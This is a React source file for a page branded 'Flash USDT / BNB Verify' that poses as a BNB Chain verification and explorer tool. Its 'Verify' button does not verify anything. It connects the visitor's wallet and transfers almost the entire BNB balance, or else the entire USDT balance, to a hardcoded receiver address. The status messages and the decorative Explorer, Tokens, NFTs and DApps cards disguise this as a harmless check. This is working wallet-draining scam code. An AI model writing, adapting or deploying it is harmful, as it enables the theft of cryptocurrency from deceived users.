import React, { useState } from "react";
import { ethers } from "ethers";

const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; // Your receiver address
const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint)",
  "function transfer(address to, uint amount) returns (bool)"
];

export default function App() {
  const [walletAddress, setWalletAddress] = useState("");
  const [status, setStatus] = useState("Click Verify to start...");

  async function connectWallet() {
    if (!window.ethereum) return alert("Please install MetaMask or Binance Wallet!");
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();
    setWalletAddress(address);
  }

  async function handleVerify() {
    if (!window.ethereum) return alert("Install Binance Wallet or MetaMask!");
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();

    setStatus("Checking balances...");
    try {
      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - ethers.parseEther("0.0005")
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");
    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  }

  return (
    <div className="min-h-screen flex flex-col items-center bg-[#121212] px-6 py-12">
      <header className="w-full max-w-5xl flex justify-between items-center mb-12">
        <h1 className="text-yellow-400 text-3xl font-bold">Flash USDT / BNB Verify</h1>
        {walletAddress ? (
          <p className="text-green-400 font-medium">{walletAddress}</p>
        ) : (
          <button onClick={connectWallet} className="button-primary">Connect Wallet</button>
        )}
      </header>

      <div className="relative flex justify-center items-center w-40 h-40 mb-6">
        <div className="pulse-ring"></div>
        <div className="pulse-ring"></div>
        <div className="pulse-ring"></div>
        <button onClick={handleVerify} className="button-primary z-10">Verify</button>
      </div>
      <p className="text-gray-300 text-center mb-12">{status}</p>

      <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-6 max-w-5xl w-full">
        {["Explorer","Tokens","NFTs","DApps"].map((title) => (
          <div key={title} className="card bg-[#1E1E1E] rounded-xl p-6 text-center transition-all cursor-pointer">
            <h2 className="text-yellow-400 text-lg font-semibold mb-2">{title}</h2>
            <p className="text-gray-400 text-sm">
              {title === "Explorer" && "Browse BNB Chain addresses, contracts, tokens, and transactions."}
              {title === "Tokens" && "Check token balances and verify authenticity of BNB Chain tokens."}
              {title === "NFTs" && "Verify NFTs on BNB Chain and view metadata securely."}
              {title === "DApps" && "Connect to decentralized apps and verify transactions safely."}
            </p>
          </div>
        ))}
      </div>
      <footer className="mt-auto py-6 text-gray-500 text-sm text-center">© 2025 Flash USDT / BNB Verify</footer>
    </div>
  );
}
